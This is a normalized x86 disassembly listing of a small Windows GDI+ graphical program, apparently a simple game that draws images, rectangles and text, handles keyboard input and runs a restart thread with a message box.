sub_401000
mov eax sub_40e7e8
call sub_40425c
sub esp 0x24
push ebx
push esi
mov esi ecx
push edi
fldz
lea edi [ esi + 0x18 ]
lea eax [ esi + 0x74 ]
fstp [ esi + 0x14 ]
fldz
xor ebx ebx
mov [ ebp - 0x30 ] 0x1
fstp [ esi + 0x10 ]
fldz
push ebx
mov [ ebp - 0x2c ] ebx
fstp [ esi + 0xc ]
fldz
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
fstp [ esi + 0x8 ]
fldz
mov [ edi ] 0xff000000
fstp [ esi + 0x34 ]
fldz
fstp [ esi + 0x30 ]
fldz
fstp [ esi + 0x2c ]
fldz
fstp [ esi + 0x28 ]
fldz
fstp [ esi + 0x70 ]
fldz
fstp [ esi + 0x6c ]
fldz
fstp [ esi + 0x68 ]
fldz
fstp [ esi + 0x64 ]
fldz
fstp [ eax + 0xc ]
fldz
fstp [ eax + 0x8 ]
fldz
fstp [ eax + 0x4 ]
fldz
fstp [ eax ]
lea eax [ ebp - 0x30 ]
mov [ esi ] r--data
push eax
lea eax [ esi + 0x8c ]
push eax
call GdiplusStartup
push edi
lea ecx [ ebp - 0x20 ]
mov [ edi ] 0xff141e28
call sub_4018c4
mov edi [ edi ]
lea eax [ ebp - 0x14 ]
push eax
push ebx
fld1
push ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] ebx
fstp [ esp ]
push edi
call GdipCreatePen1
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_40184e
lea ecx [ ebp - 0x14 ]
mov [ esi + 0x20 ] eax
call sub_40192d
push [ ebp - 0x14 ]
mov [ esi + 0x1c ] eax
call GdipDeletePen
push [ ebp - 0x1c ]
mov [ ebp - 0x20 ] r--data
call GdipDeleteBrush
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_401131
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push eax
mov [ esi + 0x84 ] eax
call [ GetDC@IAT ]
push eax
mov [ esi + 0x88 ] eax
call sub_401963
mov [ esi + 0x4 ] eax
pop ecx
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x84 ]
call [ GetClientRect@IAT ]
fild [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
mov ecx esi
sub eax [ ebp - 0x18 ]
fst [ esi + 0x74 ]
fild [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
fst [ ebp - 0x8 ]
fstp [ esi + 0x78 ]
fild [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0x2c ] eax
fst [ ebp + 0x8 ]
fst [ esi + 0x7c ]
fild [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x30 ] eax
fst [ ebp - 0x4 ]
fstp [ esi + 0x80 ]
fld st1
fstp [ esi + 0x64 ]
fmul [ r--data ]
fst [ esi + 0x68 ]
fld [ ebp + 0x8 ]
fmul [ r--data ]
fst [ esi + 0x6c ]
fld [ ebp - 0x4 ]
fsub st2
fst [ ebp - 0x4 ]
fstp [ esi + 0x70 ]
fld st2
mov eax [ ebp - 0x4 ]
fstp [ esi + 0x28 ]
fld st1
mov [ esi + 0x14 ] eax
fstp [ esi + 0x34 ]
fstp [ esi + 0x8 ]
fstp [ esi + 0xc ]
fstp st0
fld [ ebp + 0x8 ]
fmul [ r--data ]
fstp [ esi + 0x10 ]
call sub_401231
pop esi
leave
retn 0x4
sub_401201
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
push [ esi + 0x18 ]
push [ edi ]
call GdipGraphicsClear
test eax eax
je r-xdata
mov ecx esi
call sub_40128e
mov ecx esi
call sub_40147a
mov ecx esi
call sub_4015d9
pop edi
pop esi
retn
mov [ edi + 0x4 ] eax
sub_401231
push ebp
mov ebp esp
sub esp 0x64
push esi
push edi
push 0x0
mov esi ecx
push rw-data
call sub_401b22
push 0x0
push rw-data
mov [ esi + 0x24 ] eax
call sub_401b22
add esp 0x10
mov [ esi + 0x38 ] eax
add esi 0x3c
push 0x1
pop edi
push edi
lea eax [ ebp - 0x64 ]
push rw-data
push eax
call sub_404286
lea eax [ ebp - 0x64 ]
push 0x0
push eax
call sub_401b22
add esp 0x14
mov [ esi ] eax
inc edi
add esi 0x4
cmp edi 0xa
jle r-xdata
pop edi
pop esi
leave
retn
sub_40128e
mov eax sub_40e80c
call sub_40425c
sub esp 0x30
push ebx
push esi
mov esi ecx
push edi
mov ecx [ esi + 0x38 ]
call sub_401bfa
mov ecx [ esi + 0x38 ]
mov edi eax
call sub_401bd6
lea ecx [ ebp - 0x10 ]
xor ebx ebx
push ecx
push ebx
push 0x26200a
push ebx
push edi
push eax
mov [ ebp - 0x3c ] r--data
mov [ ebp - 0x10 ] ebx
call GdipCreateBitmapFromScan0
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x38 ] eax
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] ebx
test ecx ecx
mov [ ebp - 0x14 ] ebx
je r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
mov ecx [ esi + 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_401bfa
mov ecx [ esi + 0x38 ]
mov edi eax
call sub_401bd6
mov ecx [ esi + 0x38 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push eax
call GdipGetImageGraphicsContext
mov [ ebp - 0x20 ] eax
xor ecx ecx
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov ecx rw-data
call sub_40385a
lea ecx [ eax + eax * 8 ]
mov edi 0xbc
shl ecx 0x1
sub edi ecx
cmp eax ebx
je r-xdata
mov [ ebp - 0x20 ] eax
push edi
push eax
push ebx
push ebx
push ecx
push [ ebp - 0x24 ]
call GdipDrawImageRectI
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x1c ]
mov ecx rw-data
push eax
call sub_403299
mov edi eax
lea eax [ ebp - 0x2c ]
push eax
push ebx
fld1
push ecx
mov [ ebp - 0x2c ] ebx
fstp [ esp ]
push 0xffffffff
call GdipCreatePen1
mov [ ebp - 0x28 ] eax
lea eax [ edi - 0x1 ]
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
jl r-xdata
cmp eax 0x1
jle r-xdata
fld [ esi + 0x70 ]
push ecx
lea eax [ ebp - 0x3c ]
fstp [ esp ]
fld [ esi + 0x6c ]
push ecx
fstp [ esp ]
fld [ esi + 0x68 ]
push ecx
fstp [ esp ]
fld [ esi + 0x64 ]
push ecx
mov ecx [ esi + 0x4 ]
fstp [ esp ]
push eax
call sub_401a5a
push [ ebp - 0x2c ]
call GdipDeletePen
push [ ebp - 0x24 ]
call GdipDeleteGraphics
push [ ebp - 0x38 ]
mov [ ebp - 0x3c ] r--data
call GdipDisposeImage
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
xor edi edi
lea ebx [ eax + 0x1 ]
mov eax [ esi + 0x3c ]
cmp eax ebx
je r-xdata
cmp eax 0x2
jl r-xdata
mov eax [ ebp - 0x1c ]
push 0xfffffff9
mov eax [ edi + eax + 0x8 ]
lea eax [ eax + eax * 8 ]
shl eax 0x1
mov ecx eax
pop eax
sub eax ecx
push 0x9
push 0xd
push eax
push 0xa
push [ ebp - 0x2c ]
push [ ebp - 0x24 ]
call GdipDrawRectangleI
push eax
lea ecx [ ebp - 0x24 ]
call sub_401aa2
add edi 0xc
dec ebx
jne r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
lea ecx [ esi + eax * 4 + 0x38 ]
dec eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
push 0x17
push 0x16
push edi
push 0x6
push eax
push [ ebp - 0x24 ]
call GdipDrawImageRectI
cmp eax ebx
je r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
sub [ ebp - 0x10 ] 0x4
add edi 0x12
dec [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x20 ] eax
push 0x12
push 0x16
push edi
push 0x6
push eax
push [ ebp - 0x24 ]
call GdipDrawImageRectI
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
cmp eax ebx
je r-xdata
sub_40147a
mov eax sub_40e828
call sub_40425c
sub esp 0x34
push ebx
push esi
push edi
lea eax [ ebp - 0x18 ]
xor edi edi
push eax
push edi
push 0x26200a
push edi
push 0x64
mov esi ecx
push 0xc8
mov [ ebp - 0x40 ] r--data
mov [ ebp - 0x18 ] edi
call GdipCreateBitmapFromScan0
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] edi
test ecx ecx
mov [ ebp - 0x10 ] edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
push [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x1
push eax
call GdipGraphicsClear
cmp eax edi
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call GdipGetImageGraphicsContext
mov [ ebp - 0x2c ] eax
lea ecx [ ebp - 0x40 ]
call sub_401bd6
sub eax 0xa
push 0x4
cdq
pop ecx
idiv ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x18 ] eax
fild [ ebp - 0x18 ]
fstp [ ebp - 0x18 ]
call sub_401bfa
sub eax 0xa
mov ecx rw-data
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x1c ]
fild [ ebp - 0x14 ]
push eax
fstp [ ebp - 0x14 ]
fld [ r--data ]
fld [ ebp - 0x18 ]
fadd st1
fstp [ ebp - 0x24 ]
fld [ ebp - 0x14 ]
fadd st1
fstp [ ebp - 0x20 ]
fstp st0
call sub_4038a0
lea ebx [ eax - 0x1 ]
test ebx ebx
jl r-xdata
mov [ ebp - 0x2c ] eax
mov ecx [ esi + 0x4 ]
lea eax [ esi + 0x28 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_4019fc
push [ ebp - 0x10 ]
call GdipDeleteGraphics
push [ ebp - 0x3c ]
mov [ ebp - 0x40 ] r--data
call GdipDisposeImage
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ebp - 0x1c ]
fld [ ebp - 0x14 ]
fmul [ eax + edi * 8 + 0x4 ]
lea eax [ eax + edi * 8 ]
fadd [ ebp - 0x20 ]
fld [ ebp - 0x18 ]
fmul [ eax ]
mov eax [ esi + 0x24 ]
test eax eax
fadd [ ebp - 0x24 ]
fstp [ ebp - 0x28 ]
je r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
inc edi
cmp edi ebx
jle r-xdata
mov [ ebp - 0x2c ] eax
fld [ ebp - 0x14 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x18 ]
push ecx
fstp [ esp ]
push ecx
fstp [ esp ]
fld [ ebp - 0x28 ]
push ecx
fstp [ esp ]
push eax
push [ ebp - 0x10 ]
call GdipDrawImageRect
test eax eax
je r-xdata
sub_4015d9
mov eax sub_40e85c
call sub_40425c
sub esp 0xf4
push ebx
push esi
lea eax [ ebp - 0x10 ]
push edi
xor ebx ebx
push eax
push ebx
push 0x26200a
push ebx
mov esi ecx
push 0x190
push 0xc8
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x34 ] r--data
mov [ ebp - 0x10 ] ebx
call GdipCreateBitmapFromScan0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] ebx
test ecx ecx
mov [ ebp - 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1c ] eax
push [ esi + 0x18 ]
mov [ ebp - 0x4 ] 0x1
push eax
call GdipGraphicsClear
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call GdipGetImageGraphicsContext
mov [ ebp - 0x18 ] eax
fld [ r--data ]
push ebx
push 0x2
push 0x1
push ecx
mov esi rw-data
lea ecx [ ebp - 0x58 ]
fstp [ esp ]
push esi
call sub_401ab4
fld [ r--data ]
push ebx
push 0x2
push ebx
push ecx
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
fstp [ esp ]
push esi
call sub_401ab4
lea eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x50 ]
push eax
mov [ ebp - 0x4 ] 0x3
mov [ ebp - 0x20 ] 0xff00ff00
call sub_4018c4
lea eax [ ebp - 0x100 ]
push rw-data
push eax
mov [ ebp - 0x4 ] 0x4
call sub_404286
lea eax [ ebp - 0xd8 ]
push rw-data
push eax
call sub_404286
lea eax [ ebp - 0xb0 ]
push rw-data
push eax
call sub_404286
push [ rw-data ]
mov esi rw-data
lea eax [ ebp - 0xec ]
push esi
push eax
call sub_404286
push [ rw-data ]
lea eax [ ebp - 0xc4 ]
push esi
push eax
call sub_404286
push [ rw-data ]
lea eax [ ebp - 0x9c ]
push esi
push eax
call sub_404286
add esp 0x3c
lea eax [ ebp - 0x88 ]
push 0x6
pop ecx
mov [ ebp - 0x18 ] eax
fldz
fstp [ eax + 0x4 ]
fldz
fstp [ eax ]
add eax 0x8
dec ecx
jne r-xdata
lea eax [ ebp - 0x84 ]
mov [ ebp - 0x14 ] 0x14
mov edi 0x140
fild [ ebp - 0x14 ]
add [ ebp - 0x14 ] 0x78
mov [ eax - 0x4 ] 0x41800000
fstp [ eax ]
add eax 0x10
cmp [ ebp - 0x14 ] edi
jle r-xdata
lea eax [ ebp - 0xec ]
lea esi [ ebp - 0x7c ]
mov [ ebp - 0x14 ] 0x50
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
call sub_4042f5
imul eax eax 0x21
pop ecx
mov [ ebp - 0x38 ] ebx
mov ecx 0xc8
add [ ebp - 0x10 ] 0x28
sub ecx eax
shr ecx 0x1
mov [ ebp - 0x3c ] ecx
fild [ ebp - 0x3c ]
fstp [ esi - 0x4 ]
fild [ ebp - 0x14 ]
add [ ebp - 0x14 ] 0x78
fstp [ esi ]
add esi 0x10
cmp [ ebp - 0x14 ] edi
jle r-xdata
push 0x6
lea edi [ ebp - 0x100 ]
lea esi [ ebp - 0x88 ]
pop ebx
lea eax [ ebp - 0x50 ]
lea ecx [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x44 ]
push esi
push eax
push 0xffffffff
push edi
call sub_40199b
add esi 0x8
add edi 0x14
dec ebx
jne r-xdata
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x8 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx [ eax + 0x4 ]
call sub_4019fc
push [ ebp - 0x4c ]
mov [ ebp - 0x50 ] r--data
call GdipDeleteBrush
push [ ebp - 0x44 ]
call GdipDeleteFont
push [ ebp - 0x58 ]
call GdipDeleteFont
push [ ebp - 0x1c ]
call GdipDeleteGraphics
push [ ebp - 0x30 ]
mov [ ebp - 0x34 ] r--data
call GdipDisposeImage
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_40184e
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipCloneBrush
test eax eax
je r-xdata
push 0xc
call GdipAlloc
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor esi esi
mov esi [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov esi eax
jmp r-xdata
mov eax esi
pop esi
leave
retn
push [ ebp - 0x4 ]
call GdipDeleteBrush
test esi esi
jne r-xdata
sub_4018c4
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push esi
and [ ebp - 0x4 ] 0x0
mov esi ecx
lea ecx [ ebp - 0x4 ]
mov [ esi + 0x8 ] 0x6
mov [ esi ] r--data
mov eax [ eax ]
push ecx
push eax
call GdipCreateSolidFill
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop esi
leave
retn 0x4
sub_40192d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
mov esi ecx
push eax
push [ esi ]
call GdipClonePen
push 0x8
mov [ esi + 0x4 ] eax
call GdipAlloc
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
jmp r-xdata
pop esi
leave
retn
sub_401963
push ebp
mov ebp esp
push ecx
push esi
push 0x8
call GdipAlloc
mov esi eax
xor eax eax
cmp esi eax
je r-xdata
pop esi
leave
retn
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call GdipCreateFromHDC
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax esi
sub_40199b
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x14 ]
push esi
mov esi ecx
fld [ eax ]
fstp [ ebp - 0x10 ]
fld [ eax + 0x4 ]
fstp [ ebp - 0xc ]
mov eax [ ebp + 0x18 ]
fldz
test eax eax
fstp [ ebp - 0x8 ]
fldz
fstp [ ebp - 0x4 ]
je r-xdata
xor ecx ecx
mov ecx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
jmp r-xdata
push ecx
lea ecx [ ebp - 0x10 ]
push 0x0
push ecx
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi ]
call GdipDrawString
test eax eax
je r-xdata
pop esi
leave
retn 0x14
sub_4019fc
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ eax + 0x8 ]
fld [ eax + 0xc ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
jmp r-xdata
push ecx
fstp [ esp ]
fld [ ebp + 0xc ]
push ecx
fstp [ esp ]
fld [ ebp - 0x4 ]
push ecx
fstp [ esp ]
fld [ ebp - 0x8 ]
push ecx
fstp [ esp ]
push eax
push [ esi ]
call GdipDrawImageRect
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_401a5a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
test eax eax
mov esi ecx
je r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
jmp r-xdata
fld [ ebp + 0x18 ]
push ecx
fstp [ esp ]
fld [ ebp + 0x14 ]
push ecx
fstp [ esp ]
fld [ ebp + 0x10 ]
push ecx
fstp [ esp ]
fld [ ebp + 0xc ]
push ecx
fstp [ esp ]
push eax
push [ esi ]
call GdipDrawImageRect
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x14
sub_401ab4
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x18 ]
and [ ebp - 0x8 ] 0x0
push esi
mov esi ecx
test eax eax
je r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
push [ ebp - 0x8 ]
mov [ esi ] eax
call GdipDeleteFontFamily
mov eax esi
pop esi
leave
retn 0x14
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
fld [ ebp + 0xc ]
push [ ebp + 0x10 ]
push ecx
fstp [ esp ]
push [ ebp - 0x8 ]
call GdipCreateFont
mov [ esi + 0x4 ] eax
lea ecx [ ebp - 0x8 ]
push ecx
push eax
push [ ebp + 0x8 ]
call GdipCreateFontFamilyFromName
and [ ebp + 0x18 ] 0x0
and [ ebp - 0x4 ] 0x0
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
sub_401b22
mov eax sub_40e872
call sub_40425c
push ecx
push 0x10
call GdipAlloc
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401b63
sub_401b63
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
cmp [ esp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
push [ esp + 0xc ]
je r-xdata
call GdipLoadImageFromFile
call GdipLoadImageFromFileICM
jmp r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
retn 0x8
sub_401b94
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipCloneImage
test eax eax
je r-xdata
push 0x10
call GdipAlloc
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
mov esi [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] esi
jmp r-xdata
pop esi
leave
retn
sub_401bd6
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipGetImageWidth
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn
mov [ esi + 0x8 ] eax
sub_401bfa
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipGetImageHeight
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn
mov [ esi + 0x8 ] eax
sub_401cdd
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi 0x7f00
push edi
xor ebx ebx
push esi
push ebx
mov [ ebp - 0x38 ] 0x23
mov [ ebp - 0x34 ] sub_401f4b
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
call [ LoadIconA@IAT ]
push esi
push ebx
mov [ ebp - 0x24 ] eax
call [ LoadCursorA@IAT ]
push 0xa
lea esi [ ebp - 0x38 ]
pop ecx
lea edi [ ebp - 0x80 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] rw-data
[ edi ] [ esi ]
push 0xa
lea esi [ ebp - 0x38 ]
pop ecx
lea edi [ ebp - 0xa8 ]
[ edi ] [ esi ]
mov esi [ RegisterClassA@IAT ]
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x5c ] rw-data
mov [ ebp - 0x7c ] sub_401f96
mov [ ebp - 0x84 ] rw-data
mov [ ebp - 0xa4 ] sub_401fe1
call esi
test ax ax
je r-xdata
push 0x30
push rw-data
push rw-data
push ebx
call [ MessageBoxA@IAT ]
xor eax eax
lea eax [ ebp - 0x80 ]
push eax
call esi
test ax ax
je r-xdata
lea eax [ ebp - 0xa8 ]
push eax
call esi
test ax ax
je r-xdata
mov edi [ GetSystemMetrics@IAT ]
push ebx
call edi
cdq
sub eax edx
push 0x1
mov esi eax
mov eax [ rw-data ]
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
call edi
mov edi [ rw-data ]
push ebx
push [ ebp + 0x8 ]
cdq
sub eax edx
push ebx
mov ecx eax
mov eax edi
cdq
sub eax edx
push ebx
push edi
push [ rw-data ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
push ecx
push esi
mov esi [ CreateWindowExA@IAT ]
push 0xa0000
push rw-data
push rw-data
push ebx
call esi
lea ecx [ ebp - 0x10 ]
mov [ rw-data ] eax
push ecx
push eax
call [ GetClientRect@IAT ]
push ebx
mov edi rw-data
push [ ebp + 0x8 ]
push ebx
push [ rw-data ]
push [ ebp - 0x4 ]
push [ ebp - 0x4 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push 0x40000000
push edi
push rw-data
push ebx
call esi
push ebx
mov [ rw-data ] eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x4 ]
push ebx
push [ rw-data ]
push [ ebp - 0x4 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push 0x40000000
push edi
push rw-data
push ebx
call esi
mov esi [ ShowWindow@IAT ]
push ebx
push [ rw-data ]
mov [ rw-data ] eax
call esi
push ebx
push [ rw-data ]
call esi
push ebx
push [ rw-data ]
call esi
push [ rw-data ]
call [ SetFocus@IAT ]
push [ rw-data ]
mov ecx rw-data
call sub_402359
push [ rw-data ]
mov ecx rw-data
call sub_401131
push 0x100
push ebx
push rw-data
call sub_4043c0
add esp 0xc
lea eax [ ebp - 0x3c ]
push eax
push ebx
push ebx
push sub_402022
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ rw-data ] eax
mov eax [ ebp - 0x50 ]
jmp r-xdata
push 0x1
push ebx
push ebx
lea eax [ ebp - 0x58 ]
push ebx
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
cmp [ rw-data ] bl
je r-xdata
cmp [ ebp - 0x54 ] 0x12
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x58 ]
push eax
call [ DispatchMessageA@IAT ]
mov [ rw-data ] bl
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
sub_401f4b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
dec eax
dec eax
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
sub eax 0xfe
je r-xdata
push [ ebp + 0x14 ]
push esi
call sub_4020b5
pop ecx
pop ecx
jmp r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
pop esi
pop ebp
retn 0x10
and [ esi + rw-data ] 0x0
jmp r-xdata
sub_401f96
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xf
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
pop ebp
retn 0x10
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call [ BeginPaint@IAT ]
mov ecx rw-data
call sub_402530
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call [ EndPaint@IAT ]
mov ecx rw-data
call sub_40128e
sub_401fe1
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xf
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcA@IAT ]
pop ebp
retn 0x10
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call [ BeginPaint@IAT ]
mov ecx rw-data
call sub_401201
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call [ EndPaint@IAT ]
sub_402022
push ebx
xor ebx ebx
cmp [ rw-data ] bl
je r-xdata
push [ rw-data ]
call [ Sleep@IAT ]
push 0xffffffff
push ebx
push ebx
mov ecx rw-data
call sub_403334
test al al
jne r-xdata
push 0x24
push rw-data
push rw-data
push [ rw-data ]
call [ MessageBoxA@IAT ]
cmp eax 0x6
jne r-xdata
push ebx
push ebx
push 0xf
push [ rw-data ]
call [ PostMessageA@IAT ]
push rw-data
push ebx
push ebx
push sub_402022
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ rw-data ] eax
call sub_402280
push ebx
push ebx
push 0x2
push [ rw-data ]
call [ PostMessageA@IAT ]
jmp r-xdata
call sub_40221f
jmp r-xdata
xor eax eax
pop ebx
retn 0x4
sub_4020b5
mov al [ rw-data ]
push ebx
xor ebx ebx
push esi
mov esi [ esp + 0xc ]
cmp al bl
je r-xdata
cmp esi 0x20
jne r-xdata
cmp esi 0x20
jne r-xdata
cmp [ esi + rw-data ] bl
lea eax [ esi + rw-data ]
jne r-xdata
cmp al bl
sete al
cmp al bl
mov [ rw-data ] al
je r-xdata
pop esi
pop ebx
retn
push 0x1
pop edx
mov [ eax ] dl
mov al [ rw-data ]
mov cl [ rw-data ]
cmp al bl
je r-xdata
push rw-data
push ebx
push ebx
push sub_402022
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ rw-data ] eax
jmp r-xdata
push ebx
push [ rw-data ]
call [ TerminateThread@IAT ]
jmp r-xdata
sub esi 0x25
je r-xdata
cmp cl bl
